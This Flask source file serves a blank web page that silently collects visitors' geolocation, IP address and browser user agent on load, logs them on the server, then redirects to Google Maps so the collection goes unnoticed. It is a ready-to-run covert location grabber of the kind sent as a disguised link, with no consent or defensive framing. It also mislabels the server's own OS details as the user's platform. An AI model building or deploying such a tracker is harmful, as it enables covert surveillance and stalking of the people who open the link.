from flask import Flask, request
import platform

app = Flask(__name__)

@app.route('/')
def home():
    return '''
    <html>
    <head>
    <script>
    var timer;

    function getLocation() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition);
        } else {
            alert("Geolocation is not supported by this browser.");
        }
    }

    function showPosition(position) {
        var lat = position.coords.latitude;
        var lon = position.coords.longitude;
        var url = "/location?lat=" + lat + "&lon=" + lon;
        var xhr = new XMLHttpRequest();
        xhr.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                clearTimeout(timer);
                redirectToLocation();
            }
        };
        xhr.open("GET", url);
        xhr.send();
    }

    function redirectToLocation(location = "https://www.google.com/maps") {
        window.location.href = location;
    }

    function startTimer() {
        timer = setTimeout(redirectToLocation, 3000);
    }

    function getIP() {
        var url = "/ip";
        var xhr = new XMLHttpRequest();
        xhr.open("GET", url);
        xhr.send();
    }

    function getInfo() {
        var url = "/info";
        var xhr = new XMLHttpRequest();
        xhr.open("GET", url);
        xhr.send();
    }
    </script>
    </head>
    <body onload="getLocation(); startTimer(); getIP(); getInfo();" >
    </body>
    </html>
    '''


@app.route('/location')
def location():
    lat = request.args.get('lat')
    lon = request.args.get('lon')
    print(f"User's location: {lat}, {lon}")
    # You can do something with the location data here
    return "Location received"

@app.route('/ip')
def ip():
    user_ip = request.remote_addr
    print(f"User's IP address: {user_ip}")
    # You can do something with the IP address here
    return "IP received"

@app.route('/info')
def info():
    user_agent = request.headers.get('User-Agent')
    system = platform.system()
    release = platform.release()
    print(f"User's device information: {user_agent}")
    print(f"User's platform: {system} {release}")
    # You can do something with this information here
    return "Info received"

app.run(host='0.0.0.0')
